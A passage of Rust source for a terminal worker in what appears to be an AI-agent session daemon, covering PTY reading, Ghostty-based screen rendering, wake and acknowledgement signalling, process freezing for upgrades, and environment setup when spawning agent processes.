mod carry;
mod close_processes;
#[cfg(test)]
mod close_tests;
pub(crate) mod holder;

use close_processes::{FrozenFamily, RootIdentity};

use std::{
    cell::{Cell, RefCell},
    fs::File,
    io::{BufWriter, Read, Write},
    os::fd::{AsRawFd, FromRawFd, OwnedFd},
    path::PathBuf,
    rc::Rc,
    sync::{
        Arc, Mutex, OnceLock, Weak,
        atomic::{AtomicBool, AtomicU64, Ordering},
    },
    thread::{self, JoinHandle},
    time::{Duration, SystemTime, UNIX_EPOCH},
};

use arc_swap::ArcSwap;
use crossbeam_channel::{Receiver, RecvTimeoutError, Sender, TryRecvError, TrySendError};
use libghostty_vt::{
    Terminal, TerminalOptions, focus,
    key::{self, Encoder as KeyEncoder},
    mouse::{self, Encoder as MouseEncoder},
    style::{PaletteIndex, RgbColor},
    terminal::{ColorScheme, CompressionMode, CompressionResult, Mode, ScrollViewport},
};
use portable_pty::{CommandBuilder, ExitStatus, PtySize};

use crate::{
    model::{LaunchRecipe, TerminalOutputActivity, TerminalSession, agent_recovery::AgentProcess},
    secure_file::open_private_append_file,
};

use super::{
    TerminalTheme,
    snapshot::{RenderSnapshot, VisualResources},
    types::{
        KeyAction, KeyInput, KeyModifiers, MouseAction, MouseButton, MouseInput, PasteOrigin,
        TerminalConfig, TerminalEvent, TerminalKey, TerminalSendError, TerminalSize,
        TerminalStartError, TerminalWake,
    },
};

const PTY_READ_SIZE: usize = 16 * 1024;
const PTY_BATCH_LIMIT: usize = 256 * 1024;
/// Marker appended once when a transcript hits its size cap.
const TRANSCRIPT_TRUNCATED_MARKER: &[u8] = b"\n[cagents transcript truncated: size cap reached]\n";
/// Foreground observation cadence. Every tick descends `/proc` over the PTY
/// foreground subtree, so it is only worth paying while that group is moving:
/// an unchanged group backs the interval off, any change resets it, and a
/// terminal nobody is watching is never observed on the timer at all.
const FOREGROUND_POLL_MIN: Duration = Duration::from_secs(2);
const FOREGROUND_POLL_MAX: Duration = Duration::from_secs(30);
/// How long shutdown waits for the PTY reader to leave its blocking read
/// before abandoning the thread. Closing its wake pipe releases the read
/// immediately in every case we can construct; this only bounds the ones we
/// cannot, because a hung join here wedges the daemon's dispatch thread.
const READER_SHUTDOWN_GRACE: Duration = Duration::from_millis(500);

#[derive(Debug)]
enum Command {
    Input(Vec<u8>),
    Paste(String, PasteOrigin),
    Key(KeyInput),
    Mouse(MouseInput),
    Focus(bool),
    Resize(TerminalSize),
    Scroll(ScrollCommand),
    SetTheme(TerminalTheme),
    Hide,
    Reveal,
    Hibernate,
    Restore {
        visible: bool,
    },
    ObserveAgent(Sender<Option<String>>),
    PrepareUpgrade(Sender<Result<UpgradeSnapshot, String>>),
    Carry {
        socket: PathBuf,
        reply: Sender<Result<Carried, String>>,
    },
    PreserveForRestart(Sender<Result<(), String>>),
    ObserveAgentProcess(Sender<Option<AgentProcess>>),
    ApplyAgentActivity {
        process: AgentProcess,
        activity: Option<crate::agent::Activity>,
        title: Option<String>,
        reply: Sender<Option<crate::agent::Activity>>,
        deadline: std::time::Instant,
    },
    CloseChecked {
        allow_active: bool,
        deadline: std::time::Instant,
        reply: Sender<super::ipc::TerminalCloseResult>,
    },
    Shutdown,
}

/// Reversible process freeze. Dropping an uncommitted snapshot resumes its
/// exact pidfd-bound family; only committed handoff is allowed to kill it.
pub(crate) struct UpgradeSnapshot {
    pub(crate) hint: Option<String>,
    pub(crate) active: bool,
    pub(crate) size: TerminalSize,
    pub(crate) theme: TerminalTheme,
    family: FrozenFamily,
}

impl UpgradeSnapshot {
    pub(crate) fn only_agent_tree(&self, pid: i32) -> bool {
        self.family.only_agent_tree(pid)
    }

    pub(crate) fn stop(&mut self) -> Result<(), String> {
        self.family
            .kill(std::time::Instant::now() + std::time::Duration::from_secs(10))
    }
}

/// What a successor needs to show a carried terminal as it was.
#[derive(Clone, Debug)]
pub(crate) struct Carried {
    pub(crate) size: TerminalSize,
    pub(crate) theme: TerminalTheme,
    /// The conversation its agent was last seen in, as of the carry.
    pub(crate) hint: Option<String>,
}

#[derive(Clone, Copy, Debug)]
enum ScrollCommand {
    Top,
    Bottom,
    Delta(isize),
    Row(usize),
}

#[derive(Debug)]
enum PtyMessage {
    Bytes(Vec<u8>),
    Eof,
    Error(String),
}

type ChildExit = Result<ExitStatus, String>;

#[derive(Debug)]
enum WorkerEvent {
    Command(Option<Command>),
    Pty(Option<PtyMessage>),
    ChildExit(Option<ChildExit>),
    Capture,
    ObserveForeground,
}

#[derive(Debug)]
enum TranscriptMessage {
    Bytes(Vec<u8>),
    Shutdown,
}

#[derive(Debug)]
enum Effect {
    PtyWrite(Vec<u8>),
    Bell,
    Title(String),
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum Visibility {
    Visible,
    Hidden,
    Hibernated,
}

type WakeCallback = dyn Fn(TerminalWake) + Send + Sync + 'static;

struct PublishedState {
    snapshot: ArcSwap<RenderSnapshot>,
    published_generation: AtomicU64,
    acknowledged_generation: AtomicU64,
    capture_tx: Sender<()>,
    capture_rx: Receiver<()>,
    activity: Mutex<Option<TerminalOutputActivity>>,
    agent_activity: Mutex<Option<crate::agent::Activity>>,
    agent_process: Mutex<Option<AgentProcess>>,
    agent_observer: OnceLock<Arc<dyn Fn() + Send + Sync>>,
    semantic_events: OnceLock<Weak<Sender<TerminalEvent>>>,
    conversation_title: Mutex<Option<String>>,
    completed: AtomicBool,
    /// Final result ownership survives emulator teardown and daemon crashes.
    retained_holder: Mutex<Option<holder::Holder>>,
    /// The newest generation a wake has already announced to the subscriber
    /// side of this protocol.
    ///
    /// Announcing each published generation exactly once is still one wake per
    /// drawn frame, because `capture_if_ready` withholds the next capture until
    /// that generation is acknowledged. A "a wake is pending" flag measured the
    /// same thing but could only be cleared by an acknowledgement, so an edge
    /// its callback dropped - a repaint broadcast while no subscriber was
    /// visible - suppressed every later generation, including the capture a
    /// reveal forces.
    announced_generation: AtomicU64,
    visible: AtomicBool,
    wake: Arc<WakeCallback>,
    output_observer: OnceLock<Arc<dyn Fn(u64) + Send + Sync>>,
    output_armed: AtomicBool,
}

impl PublishedState {
    fn new(visible: bool, wake: Arc<WakeCallback>) -> Self {
        let (capture_tx, capture_rx) = crossbeam_channel::bounded(1);
        Self {
            snapshot: ArcSwap::from_pointee(RenderSnapshot::empty()),
            published_generation: AtomicU64::new(0),
            acknowledged_generation: AtomicU64::new(0),
            capture_tx,
            capture_rx,
            activity: Mutex::new(None),
            agent_activity: Mutex::new(None),
            agent_process: Mutex::new(None),
            agent_observer: OnceLock::new(),
            semantic_events: OnceLock::new(),
            conversation_title: Mutex::new(None),
            completed: AtomicBool::new(false),
            retained_holder: Mutex::new(None),
            announced_generation: AtomicU64::new(0),
            visible: AtomicBool::new(visible),
            wake,
            output_observer: OnceLock::new(),
            output_armed: AtomicBool::new(false),
        }
    }

    fn set_agent_activity(&self, activity: Option<crate::agent::Activity>) {
        let mut current = self
            .agent_activity
            .lock()
            .unwrap_or_else(|p| p.into_inner());
        if *current != activity {
            *current = activity;
            // Serialize metadata and its edge, including timeout invalidation
            // from another thread. The weak sender cannot keep a dead worker's
            // semantic stream open through its host event receiver.
            if let Some(events) = self.semantic_events.get().and_then(Weak::upgrade) {
                let _ = events.send(TerminalEvent::AgentActivityChanged(activity));
            }
        }
    }

    fn publish(&self, snapshot: Arc<RenderSnapshot>) {
        let generation = snapshot.generation;
        // The immutable snapshot must be observable before the edge is emitted.
        self.snapshot.store(snapshot);
        self.published_generation
            .store(generation, Ordering::Release);
        self.request_wake(generation);
    }

    fn detach(&self, generation: u64) {
        self.snapshot
            .store(Arc::new(RenderSnapshot::detached(generation)));
        self.published_generation
            .store(generation, Ordering::Release);
    }

    fn request_wake(&self, generation: u64) {
        if !self.visible.load(Ordering::Acquire) {
            return;
        }
        if self
            .announced_generation
            .fetch_max(generation, Ordering::AcqRel)
            < generation
        {
            (self.wake)(TerminalWake { generation });
        }
    }

    fn suppress_wakes(&self) {
        self.visible.store(false, Ordering::Release);
    }

    /// Records the generation the subscriber drew and releases the capture
    /// credit for the next one.
    ///
    /// It re-arms nothing: a publication announces its own generation, so
    /// there is no edge for an acknowledgement to re-open.
    fn acknowledge(&self, observed_generation: u64) {
        // A subscriber cannot acknowledge a generation this worker never
        // published; that would let the capture loop run ahead of the UI.
        let observed_generation =
            observed_generation.min(self.published_generation.load(Ordering::Acquire));
        let previous = self
            .acknowledged_generation
            .fetch_max(observed_generation, Ordering::AcqRel);
        if observed_generation > previous {
            let _ = self.capture_tx.try_send(());
        }
    }
}

struct HandleInner {
    commands: Sender<Command>,
    events: Receiver<TerminalEvent>,
    published: Arc<PublishedState>,
    worker: Mutex<Option<JoinHandle<()>>>,
}

impl Drop for HandleInner {
    fn drop(&mut self) {
        let on_worker_thread = self
            .worker
            .get_mut()
            .ok()
            .and_then(|worker| worker.as_ref())
            .is_some_and(|worker| worker.thread().id() == thread::current().id());
        if on_worker_thread {
            let _ = self.commands.try_send(Command::Shutdown);
        } else {
            let _ = self.commands.send(Command::Shutdown);
        }
        if let Ok(worker) = self.worker.get_mut()
            && let Some(worker) = worker.take()
            && worker.thread().id() != thread::current().id()
        {
            let _ = worker.join();
        }
    }
}

#[derive(Clone)]
pub struct TerminalHandle {
    inner: Arc<HandleInner>,
}

impl std::fmt::Debug for TerminalHandle {
    fn fmt(&self, formatter: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        formatter
            .debug_struct("TerminalHandle")
            .field("generation", &self.generation())
            .finish_non_exhaustive()
    }
}

impl TerminalHandle {
    pub fn spawn(
        session: TerminalSession,
        config: TerminalConfig,
        wake: impl Fn(TerminalWake) + Send + Sync + 'static,
    ) -> Result<Self, TerminalStartError> {
        let (command_tx, command_rx) = command_channel(config.command_capacity);
        // Semantic events are lossless and independent from visual wakes. They
        // are low-volume metadata; an unbounded queue avoids either dropping a
        // terminal exit/error or deadlocking teardown behind the UI receiver.
        let (event_tx, event_rx) = crossbeam_channel::unbounded();
        let published = Arc::new(PublishedState::new(
            config.initially_visible,
            Arc::new(wake),
        ));
        let worker_published = Arc::clone(&published);
        let (startup_tx, startup_rx) = std::sync::mpsc::sync_channel(1);

        let worker = thread::Builder::new()
            .name(format!("terminal-{:?}", session.id))
            .spawn(move || {
                let completion = Arc::clone(&worker_published);
                let result = Worker::start(session, config, command_rx, event_tx, worker_published);
                match result {
                    Ok(worker) => {
                        let _ = startup_tx.send(Ok(()));
                        worker.run();
                    }
                    Err(error) => {
                        let _ = startup_tx.send(Err(error));
                    }
                }
                // Only completed teardown is evidence that no worker/PTY
                // remains. An unexpected panic conservatively retains live
                // inventory rather than certifying unobserved cleanup.
                completion.completed.store(true, Ordering::Release);
            })
            .map_err(|error| TerminalStartError::Worker(error.to_string()))?;

        match startup_rx.recv() {
            Ok(Ok(())) => Ok(Self {
                inner: Arc::new(HandleInner {
                    commands: command_tx,
                    events: event_rx,
                    published,
                    worker: Mutex::new(Some(worker)),
                }),
            }),
            Ok(Err(error)) => {
                let _ = worker.join();
                Err(TerminalStartError::Worker(error))
            }
            Err(_) => {
                let _ = worker.join();
                Err(TerminalStartError::WorkerExited)
            }
        }
    }

    pub fn snapshot(&self) -> Arc<RenderSnapshot> {
        self.inner.published.snapshot.load_full()
    }

    pub fn activity(&self) -> Option<TerminalOutputActivity> {
        *self
            .inner
            .published
            .activity
            .lock()
            .unwrap_or_else(|error| error.into_inner())
    }

    pub(crate) fn agent_activity(&self) -> Option<crate::agent::Activity> {
        *self
            .inner
            .published
            .agent_activity
            .lock()
            .unwrap_or_else(|error| error.into_inner())
    }

    pub(crate) fn observe_agent_process(&self) -> Option<AgentProcess> {
        let (reply, result) = crossbeam_channel::bounded(1);
        let process = self
            .try_command(Command::ObserveAgentProcess(reply))
            .ok()
            .and_then(|()| result.recv_timeout(std::time::Duration::from_secs(3)).ok())
            .flatten();
        if process.is_none() {
            self.invalidate_agent_activity();
        }
        process
    }

    /// Process discovery belongs to the PTY owner, independently of GUI clients.
    pub(crate) fn cached_agent_process(&self) -> Option<AgentProcess> {
        self.inner
            .published
            .agent_process
            .lock()
            .unwrap_or_else(|p| p.into_inner())
            .clone()
    }

    pub(crate) fn set_agent_process_observer(&self, observer: impl Fn() + Send + Sync + 'static) {
        let _ = self.inner.published.agent_observer.set(Arc::new(observer));
        if let Some(observer) = self.inner.published.agent_observer.get() {
            observer();
        }
    }

    pub(crate) fn apply_agent_activity(
        &self,
        process: AgentProcess,
        activity: Option<crate::agent::Activity>,
        title: Option<String>,
    ) -> Option<crate::agent::Activity> {
        let (reply, result) = crossbeam_channel::bounded(1);
        let timeout = std::time::Duration::from_secs(3);
        let deadline = std::time::Instant::now() + timeout;
        if self
            .try_command(Command::ApplyAgentActivity {
                process,
                activity,
                title,
                reply,
                deadline,
            })
            .is_ok()
            && let Ok(activity) = result.recv_timeout(timeout)
        {
            return activity;
        }
        self.invalidate_agent_activity();
        None
    }

    fn invalidate_agent_activity(&self) {
        // A failed owner request cannot leave attach descriptors claiming work.
        self.inner.published.set_agent_activity(None);
    }

    /// True only after final capture, PTY teardown and reader/reaper cleanup.
    /// Foreground-process exit alone does not imply completion.
    pub fn is_completed(&self) -> bool {
        self.inner.published.completed.load(Ordering::Acquire)
    }
    pub(crate) fn same_worker(&self, other: &Self) -> bool {
        Arc::ptr_eq(&self.inner, &other.inner)
    }

    pub fn generation(&self) -> u64 {
        self.inner
            .published
            .published_generation
            .load(Ordering::Acquire)
    }

    /// Acknowledges a delivered redraw edge after observing its snapshot.
    /// Call this even if the card became hidden before the edge was handled;
    /// the client calls it after drawing.
    pub fn acknowledge_redraw(&self, observed_generation: u64) {
        self.inner.published.acknowledge(observed_generation);
    }

    /// Install the host's lightweight observer before arming a subscription.
    pub(crate) fn set_output_observer(&self, observer: impl Fn(u64) + Send + Sync + 'static) {
        let _ = self.inner.published.output_observer.set(Arc::new(observer));
    }

    /// Arm one output edge and return its history boundary atomically with PTY
    /// activity publication. Captures and redraw credit are deliberately unrelated.
    pub(crate) fn observe_next_output(&self) -> u64 {
        let published = &self.inner.published;
        let activity = published
            .activity
            .lock()
            .unwrap_or_else(|error| error.into_inner());
        published.output_armed.store(true, Ordering::Release);
        activity.map_or(0, |fact| fact.sequence)
    }

    pub(crate) fn stop_observing_output(&self) {
        self.inner
            .published
            .output_armed
            .store(false, Ordering::Release);
    }

    pub fn events(&self) -> Receiver<TerminalEvent> {
        self.inner.events.clone()
    }

    pub fn input(&self, bytes: impl Into<Vec<u8>>) -> Result<(), TerminalSendError> {
        self.try_command(Command::Input(bytes.into()))
    }

    pub fn paste(
        &self,
        text: impl Into<String>,
        origin: PasteOrigin,
    ) -> Result<(), TerminalSendError> {
        self.try_command(Command::Paste(text.into(), origin))
    }

    pub fn key(&self, key: KeyInput) -> Result<(), TerminalSendError> {
        self.try_command(Command::Key(key))
    }

    pub fn mouse(&self, mouse: MouseInput) -> Result<(), TerminalSendError> {
        self.try_command(Command::Mouse(mouse))
    }

    pub fn focus(&self, focused: bool) -> Result<(), TerminalSendError> {
        self.try_command(Command::Focus(focused))
    }

    pub fn resize(&self, size: TerminalSize) -> Result<(), TerminalSendError> {
        self.try_command(Command::Resize(size))
    }

    pub fn scroll_lines(&self, delta: isize) -> Result<(), TerminalSendError> {
        self.try_command(Command::Scroll(ScrollCommand::Delta(delta)))
    }

    pub fn scroll_to_top(&self) -> Result<(), TerminalSendError> {
        self.try_command(Command::Scroll(ScrollCommand::Top))
    }

    pub fn scroll_to_bottom(&self) -> Result<(), TerminalSendError> {
        self.try_command(Command::Scroll(ScrollCommand::Bottom))
    }

    pub fn scroll_to_row(&self, row: usize) -> Result<(), TerminalSendError> {
        self.try_command(Command::Scroll(ScrollCommand::Row(row)))
    }

    pub fn set_theme(&self, theme: TerminalTheme) -> Result<(), TerminalSendError> {
        self.try_command(Command::SetTheme(theme))
    }

    pub fn hide(&self) -> Result<(), TerminalSendError> {
        self.try_command(Command::Hide)
    }

    pub fn reveal(&self) -> Result<(), TerminalSendError> {
        self.try_command(Command::Reveal)
    }

    pub fn hibernate(&self) -> Result<(), TerminalSendError> {
        self.try_command(Command::Hibernate)
    }

    pub fn restore(&self, visible: bool) -> Result<(), TerminalSendError> {
        self.try_command(Command::Restore { visible })
    }

    /// Resolve fresh foreground evidence on the PTY owner thread. This never
    /// sends terminal input or starts a provider process.
    pub(crate) fn observe_agent(&self) -> Result<Option<String>, String> {
        let (sender, receiver) = crossbeam_channel::bounded(1);
        self.try_command(Command::ObserveAgent(sender))
            .map_err(|error| error.to_string())?;
        receiver
            .recv_timeout(std::time::Duration::from_secs(3))
            .map_err(|error| format!("Cannot inspect the active agent: {error}"))
    }

    pub(crate) fn prepare_upgrade(&self) -> Result<UpgradeSnapshot, String> {
        let (sender, receiver) = crossbeam_channel::bounded(1);
        self.try_command(Command::PrepareUpgrade(sender))
            .map_err(|error| error.to_string())?;
        receiver
            .recv_timeout(std::time::Duration::from_secs(5))
            .map_err(|error| format!("Cannot freeze terminal for upgrade: {error}"))?
    }

    /// Leaves the terminal running under its holder for a successor daemon
    /// to [adopt](TerminalConfig::adoption) from `socket`, with its screen as
    /// this worker last drew it. The worker then ends without touching the
    /// terminal's processes. On failure its processes stay here, though a
    /// full-screen program's display may need redrawing.
    ///
    /// This waits for the worker's answer however long it takes, as shutdown
    /// does: every step of a carry is bounded, and a caller that stopped
    /// waiting could not tell a terminal left here from one already carried.
    pub(crate) fn carry(&self, socket: PathBuf) -> Result<Carried, String> {
        let (reply, result) = crossbeam_channel::bounded(1);
        self.send_command(Command::Carry { socket, reply })
            .map_err(|error| error.to_string())?;
        let carried = result
            .recv()
            .map_err(|_| "the terminal ended before it could be carried".to_owned())??;
        if let Ok(mut worker) = self.inner.worker.lock()
            && let Some(worker) = worker.take()
        {
            let _ = worker.join();
        }
        Ok(carried)
    }

    /// Inspection and the close decision are one serialized PTY-owner command.
    pub(crate) fn close_checked(&self, allow_active: bool) -> super::ipc::TerminalCloseResult {
        use super::ipc::TerminalCloseResult;
        if self.is_completed() {
            self.release_completed_holder();
            return TerminalCloseResult::Closed;
        }
        let (reply, result) = crossbeam_channel::bounded(1);
        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(3);
        if let Err(error) = self.try_command(Command::CloseChecked {
            allow_active,
            deadline,
            reply,
        }) {
            return TerminalCloseResult::Unknown(error.to_string());
        }
        let outcome = result
            .recv_timeout(std::time::Duration::from_secs(3))
            .unwrap_or_else(|error| TerminalCloseResult::Unknown(error.to_string()));
        if outcome == TerminalCloseResult::Closed {
            // Completion is not reported until the owner has released its PTY.
            match self.inner.worker.lock() {
                Ok(mut worker) => {
                    if let Some(worker) = worker.take() {
                        if worker.join().is_err() {
                            return TerminalCloseResult::Unknown(
                                "Terminal worker failed during close".into(),
                            );
                        }
                    }
                }
                Err(_) => {
                    return TerminalCloseResult::Unknown("Terminal worker unavailable".into());
                }
            }
        }
        outcome
    }

    pub fn shutdown(&self) -> Result<(), TerminalSendError> {
        let sent = self.send_command(Command::Shutdown);
        if let Ok(mut worker) = self.inner.worker.lock()
            && let Some(worker) = worker.take()
            && worker.thread().id() != thread::current().id()
        {
            let _ = worker.join();
        }
        self.release_completed_holder();
        if self.is_completed() { Ok(()) } else { sent }
    }

    fn release_completed_holder(&self) {
        let holder = self
            .inner
            .published
            .retained_holder
            .lock()
            .unwrap_or_else(|poisoned| poisoned.into_inner())
            .take();
        drop(holder);
    }

    pub(crate) fn preserve_completed_for_restart(&self) {
        let holder = self
            .inner
            .published
            .retained_holder
            .lock()
            .unwrap_or_else(|poisoned| poisoned.into_inner())
            .take();
        if let Some(mut holder) = holder {
            holder.leave_for_successor();
        }
    }

    /// Failed checkpoint restoration must never release an adopted registered
    /// holder. Serialize with completion, then transfer any final retained
    /// screen; a live parser that cannot serialize is honestly screen-lost.
    pub(crate) fn preserve_for_restart(&self) -> Result<(), String> {
        let (reply, result) = crossbeam_channel::bounded(1);
        if self
            .send_command(Command::PreserveForRestart(reply))
            .is_ok()
            && let Ok(result) = result.recv()
        {
            result?;
        }
        if let Ok(mut worker) = self.inner.worker.lock()
            && let Some(worker) = worker.take()
        {
            worker
                .join()
                .map_err(|_| "terminal worker failed while preserving its holder")?;
        }
        self.preserve_completed_for_restart();
        Ok(())
    }

    fn try_command(&self, command: Command) -> Result<(), TerminalSendError> {
        self.inner
            .commands
            .try_send(command)
            .map_err(|error| match error {
                TrySendError::Full(_) => TerminalSendError::Full,
                TrySendError::Disconnected(_) => TerminalSendError::Closed,
            })
    }

    fn send_command(&self, command: Command) -> Result<(), TerminalSendError> {
        self.inner
            .commands
            .send(command)
            .map_err(|_| TerminalSendError::Closed)
    }
}

fn command_channel(capacity: usize) -> (Sender<Command>, Receiver<Command>) {
    crossbeam_channel::bounded(capacity.max(1))
}

struct Worker {
    terminal_id: crate::model::TerminalId,
    launch: LaunchRecipe,
    resume_hint: Option<String>,
    resume_foreground: Option<libc::pid_t>,
    /// Current timer interval for foreground observation. Grows while the
    /// foreground process group is unchanged and no agent was found.
    foreground_poll: Duration,
    last_foreground_observation: std::time::Instant,
    agent_provider: Option<crate::agent::Provider>,
    agent_process: Option<AgentProcess>,
    display_title: String,
    agent_exited: bool,
    root_exit: Option<TerminalEvent>,
    terminal: Terminal<'static, 'static>,
    theme: Rc<Cell<TerminalTheme>>,
    key_encoder: KeyEncoder<'static>,
    mouse_encoder: MouseEncoder<'static>,
    effects: Rc<RefCell<Vec<Effect>>>,
    visual: Option<VisualResources>,
    visibility: Visibility,
    generation: u64,
    capture_dirty: bool,
    force_capture: bool,
    /// Size the widget last asked for; the size a resumed or upgraded terminal
    /// is rebuilt with.
    current_size: TerminalSize,
    /// Sizes actually in effect. A failed ioctl must never be remembered as
    /// applied: the widget re-sends the same steady-state size, and a cached
    /// failure would short-circuit that retry and leave the child on its old
    /// SIGWINCH dimensions forever.
    applied_pty_size: TerminalSize,
    applied_parser_size: TerminalSize,
    commands: Receiver<Command>,
    pty_rx: Receiver<PtyMessage>,
    events: Arc<Sender<TerminalEvent>>,
    transcript: Option<TranscriptWriter>,
    published: Arc<PublishedState>,
    master: holder::PtyMaster,
    writer: File,
    child: holder::HeldChild,
    child_exit_rx: Receiver<ChildExit>,
    child_identity: Option<RootIdentity>,
    checked_shutdown: bool,
    /// The terminal was left to its holder for a successor daemon, so ending
    /// this worker must not end its processes.
    carried: bool,
    /// The process that owns this terminal's PTY and reaps its root.
    /// Released last, once nothing here reads or writes the terminal.
    holder: holder::Holder,
    reader: Option<JoinHandle<()>>,
    /// Write end of the reader's wake pipe. Closing it releases a read that a
    /// disowned grandchild would otherwise hold open indefinitely.
    reader_wake: Option<OwnedFd>,
    /// Disconnects when the reader thread returns, so shutdown can wait for
    /// it with a deadline instead of joining unconditionally.
    reader_done: Receiver<()>,
    pty_capacity: usize,
}

/// The thread that reads a terminal's PTY into its worker.
struct Reader {
    thread: JoinHandle<()>,
    start: Option<Sender<()>>,
    /// Closing this releases the reader, however long a read would block.
    wake: OwnedFd,
    done: Receiver<()>,
    output: Receiver<PtyMessage>,
}

impl Reader {
    /// Starts reading `master`, delivering `pending` before anything it reads.
    fn start(
        terminal_id: crate::model::TerminalId,
        master: &holder::PtyMaster,
        capacity: usize,
        pending: Vec<u8>,
    ) -> Result<Self, String> {
        let mut reader = Self::prepare(terminal_id, master, capacity, pending)?;
        reader.activate();
        Ok(reader)
    }

    /// Allocate the reader without consuming PTY output until ownership commits.
    fn prepare(
        terminal_id: crate::model::TerminalId,
        master: &holder::PtyMaster,
        capacity: usize,
        pending: Vec<u8>,
    ) -> Result<Self, String> {
        let duplicate = |purpose: &str| {
            master
                .duplicate()
                .map_err(|error| format!("duplicate PTY descriptor for {purpose}: {error}"))
        };
        let mut reader = File::from(duplicate("reading")?);
        // Closing the master does not release a read already blocked on a
        // duplicate: a PTY master read only fails with EIO once the last slave
        // descriptor closes, which a disowned grandchild can defer forever.
        // Wait for readiness on a descriptor this worker hands over instead,
        // alongside a pipe whose closure is the shutdown signal, so the reader
        // always has a way out.
        let readiness = duplicate("readiness")?;
        let (wake_rx, wake) = wake_pipe()?;
        let (pty_tx, output) = crossbeam_channel::bounded(capacity.max(1));
        if !pending.is_empty() {
            let _ = pty_tx.send(PtyMessage::Bytes(pending));
        }
        let (done_tx, done) = crossbeam_channel::bounded::<()>(0);
        let (start, started) = crossbeam_channel::bounded(1);
        let thread = thread::Builder::new()
            .name(format!("terminal-pty-reader-{terminal_id:?}"))
            .spawn(move || {
                let _done = done_tx;
                if started.recv().is_ok() {
                    read_pty(&mut reader, &pty_tx, readiness, wake_rx);
                }
            })
            .map_err(|error| format!("start PTY reader: {error}"))?;
        Ok(Self {
            thread,
            start: Some(start),
            wake,
            done,
            output,
        })
    }

    fn activate(&mut self) {
        if let Some(start) = self.start.take() {
            let _ = start.send(());
        }
    }
}

impl Worker {
    fn start(
        session: TerminalSession,
        config: TerminalConfig,
        commands: Receiver<Command>,
        events: Sender<TerminalEvent>,
        published: Arc<PublishedState>,
    ) -> Result<Self, String> {
        let current_size = TerminalSize {
            columns: config.columns.max(1),
            rows: config.rows.max(1),
            cell_width_px: config.cell_width_px.max(1),
            cell_height_px: config.cell_height_px.max(1),
        };
        let mut terminal = Terminal::new(TerminalOptions {
            cols: current_size.columns,
            rows: current_size.rows,
            max_scrollback: config.max_scrollback,
        })
        .map_err(|error| format!("create Ghostty terminal: {error}"))?;
        apply_theme(&mut terminal, config.theme)
            .map_err(|error| format!("configure terminal theme: {error}"))?;
        let theme = Rc::new(Cell::new(config.theme));
        terminal
            .on_color_scheme({
                let theme = Rc::clone(&theme);
                move |_| Some(theme_scheme(theme.get()))
            })
            .map_err(|error| format!("register color scheme query: {error}"))?;

        let effects = Rc::new(RefCell::new(Vec::new()));
        terminal
            .on_pty_write({
                let effects = Rc::clone(&effects);
                move |_terminal, bytes| {
                    effects.borrow_mut().push(Effect::PtyWrite(bytes.to_vec()));
                }
            })
            .map_err(|error| format!("register PTY response effect: {error}"))?;
        terminal
            .on_bell({
                let effects = Rc::clone(&effects);
                move |_terminal| effects.borrow_mut().push(Effect::Bell)
            })
            .map_err(|error| format!("register bell effect: {error}"))?;
        terminal
            .on_title_changed({
                let effects = Rc::clone(&effects);
                move |terminal| {
                    let title = terminal.title().unwrap_or_default().to_owned();
                    effects.borrow_mut().push(Effect::Title(title));
                }
            })
            .map_err(|error| format!("register title effect: {error}"))?;

        let mut command = match &config.execution_environment {
            Some(environment) => {
                let mut command = CommandBuilder::new(&session.launch.program);
                command.args(&session.launch.arguments);
                command.cwd(&session.launch.working_directory);
                command.env_clear();
                for (name, value) in &environment.0 {
                    command.env(name, value);
                }
                scrub_inherited_markers(&mut command);
                terminal_environment(&mut command);
                command
            }
            None => command_from_recipe(&session.launch),
        };
        for name in crate::account::launch_credential_overrides(&session.launch) {
            command.env_remove(name);
        }
        command.env("CAGENTS_TERMINAL_ID", session.id.to_string());
        command.env_remove(crate::agent_execution::AUTHORITY_ENV);
        if let Some(token) = config.agent_authority.token() {
            command.env(crate::agent_execution::AUTHORITY_ENV, token);
        }
        command.env(
            "CAGENTS_RECOVERY_ORIGIN",
            session.recovery_origin.unwrap_or(session.id).to_string(),
        );
        let executable = interactive_shell_launch(&session.launch)
            .then(|| RootIdentity::launch_executable(&command))
            .flatten();
        let (child_exit_tx, child_exit_rx) = crossbeam_channel::bounded(1);
        let (mut held, output) =
            match &config.adoption {
                Some(socket) => {
                    let adopted = holder::adopt_recoverable(
                        socket,
                        child_exit_tx,
                        config.holder_recovery.clone(),
                    )?;
                    // Drawing the screen again is not news, except for the title
                    // it sets: whatever it provoked, a reply or a bell, happened
                    // when its predecessor drew it.
                    terminal.vt_write(&adopted.screen);
                    effects
                        .borrow_mut()
                        .retain(|effect| matches!(effect, Effect::Title(_)));
                    if adopted.screen_lost {
                        // A crash has no emulator snapshot. Nudge full-screen
                        // clients to redraw on their surviving controlling PTY.
                        adopted.held.master.request_redraw().map_err(|error| {
                            format!("request surviving terminal redraw: {error}")
                        })?;
                    }
                    (adopted.held, adopted.output)
                }
                None => {
                    let environment = crate::account::Account::PROVIDERS
                        .into_iter()
                        .filter_map(|provider| {
                            let name = crate::account::home_variable(provider)?;
                            Some((name.to_owned(), command.get_env(name)?.to_str()?.to_owned()))
                        })
                        .collect();
                    let _account = crate::account::registry::authorize_spawn(&environment, None)
                        .map_err(|error| error.to_string())?;
                let mut skill_environment: std::collections::BTreeMap<String, String> = environment;
                if let Some(home) = command.get_env("HOME").and_then(|value| value.to_str()) {
                    skill_environment.insert("HOME".into(), home.into());
                }
                crate::agent_execution::bundled::install(
                    crate::agent::Provider::from_program(&session.launch.program),
                    &skill_environment,
                );
                if let Some(path) = crate::agent_execution::bundled::matched_path(
                    command.get_env("PATH").and_then(|value| value.to_str()),
                ) {
                    command.env("PATH", path);
                }
                    (
                        holder::spawn_recoverable(
                            command,
                            pty_size(current_size),
                            child_exit_tx,
                            config.holder_recovery.clone(),
                        )?,
                        Vec::new(),
                    )
                }
            };
        // The holder reaps the root, so its pid identifies it only while the
        // pidfd still reaches an unreaped process: checked after the capture,
        // that proves the capture read the root and not a reused pid.
        let child_identity = RootIdentity::capture(held.child.pid(), executable)
            .ok()
            .filter(|_| held.child.unreaped());
        let duplicate = |purpose: &str| {
            held.master
                .duplicate()
                .map_err(|error| format!("duplicate PTY descriptor for {purpose}: {error}"))
        };
        let writer = File::from(duplicate("writing")?);
        // Output an adopted terminal produced between daemons comes first, as
        // any other output would.
        let mut reader = Reader::prepare(session.id, &held.master, config.pty_capacity, output)?;

        let transcript = session
            .transcript_path
            .map(|path| {
                TranscriptWriter::start(
                    path,
                    config.transcript_capacity.max(1),
